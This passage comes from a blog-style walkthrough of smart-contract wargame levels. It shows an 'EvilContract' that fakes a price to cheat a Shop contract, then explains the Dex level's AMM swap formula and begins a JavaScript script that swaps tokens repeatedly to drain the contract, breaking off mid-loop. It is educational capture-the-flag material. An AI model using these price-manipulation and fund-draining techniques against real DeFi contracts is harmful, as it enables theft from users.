<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">Shop</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">buy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>  external </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">isSold</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span>  external view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>    address victimAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#4ec9b0">Shop</span><span> shopContract</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setVictimAddress</span><span class="token" style="color:#d4d4d4">(</span><span> </span><span class="token" style="color:#9cdcfe">address _victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>        victimAddress</span><span class="token" style="color:#d4d4d4">=</span><span> _victimAddress</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        shopContract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Shop</span><span class="token" style="color:#d4d4d4">(</span><span>_victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">price</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> external view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> shopContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">isSold</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">?</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">buy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>        shopContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">buy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="dex">Dex</h2>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">This challenge and it&#x27;s second version will have the same solution basically with a little tweak. Better understand the concept</code></p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &quot;bad&quot; price of the assets.</p>
</blockquote>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">The logic is faultless or is it ?  Well to be honest had to try many things here. One thing that got my attention that the equation made to calculate the swap_amount was familiar but not that much</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/17dcc969cfc52464829cb1a88231824931fda3a5b0d0b1d3d446eaf763974942_xxpfji.png" alt="Dex Equation" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Dex Equation</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">A good read to understand it <a class="chakra-link css-9olwc6" href="https://www.gemini.com/cryptopedia/amm-what-are-automated-market-makers">Amazing Article to understand AMM</a>.</p>
<p class="chakra-text css-0" node="[object Object]">So actually by balancing our token balance from one token to another we will manage at last to drain the contract&#x27;s balance of one token&#x27;s type.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">-----
<span class="chakra-text css-gv9qss">Exploitation</span>ation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> contractABI </span><span class="token" style="color:#d4d4d4">=</span><span> artifacts</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Dex&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#6a9955">// if token1.balance &gt; token2.balance ==&gt; token2 is more expensive because it has less tokens</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#6a9955">// we want to trade the most expensive tokens</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#6a9955">// knowTokenValues() ==&gt; Distiniguishing the most expensive and cheapest token</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#6a9955">// getSwapValues() // Basically our balance in the most expensive token</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#6a9955">// ==============================</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span></span><span class="token" style="color:#569CD6">let</span><span> contract </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span></span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;0xE651aD37ac31B03F7B49036248A29DC75D0093E6&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#ce9178">&#x27;PLAYER_ADDRESS&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getBalances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> token1Balance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> token2Balance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">Current Balances for contract : A : </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">token1Balance</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> \t B : </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">token2Balance</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>token1Balance</span><span class="token" style="color:#d4d4d4">,</span><span>token2Balance</span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">knowTokenValues</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">token1Balance</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe">token2Balance</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">:</span><span> token1Balance </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> token2Balance </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span class="token literal-property" style="color:#9cdcfe">cheapestToken</span><span class="token" style="color:#d4d4d4">:</span><span>token1Balance </span><span class="token" style="color:#d4d4d4">&lt;</span><span> token2Balance </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getSwapValues</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">tokensWithValues</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> toSwap  </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>tokensWithValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> available </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>tokensWithValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span><span>    </span><span class="token" style="color:#6a9955">// to be able to drain the funds and not stop when we got too much tokens.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span>    </span><span class="token" style="color:#c586c0">if</span><span class="token" style="color:#d4d4d4">(</span><span>toSwap</span><span class="token" style="color:#d4d4d4">&gt;</span><span>available</span><span class="token" style="color:#d4d4d4">)</span><span>toSwap</span><span class="token" style="color:#d4d4d4">=</span><span>available</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> toSwap</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">33</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">34</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">35</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">36</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">drainFunds</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">37</span>    
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">38</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> flag</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// check condition</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">39</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">40</span><span>    </span><span class="token" style="color:#6a9955">// approving otherwise you will get an error due to how ERC20 works.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">41</span><span>    </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">10000</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">42</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">43</span><span>    </span><span class="token" style="color:#c586c0">while</span><span class="token" style="color:#d4d4d4">(</span><span>flag</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">44</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> balances </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getBalances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">45</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> tokenValues </span><span class="token" style="color:#d4d4d4">=</span><span>  </span><span class="token" style="color:#dcdcaa">knowTokenValues</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
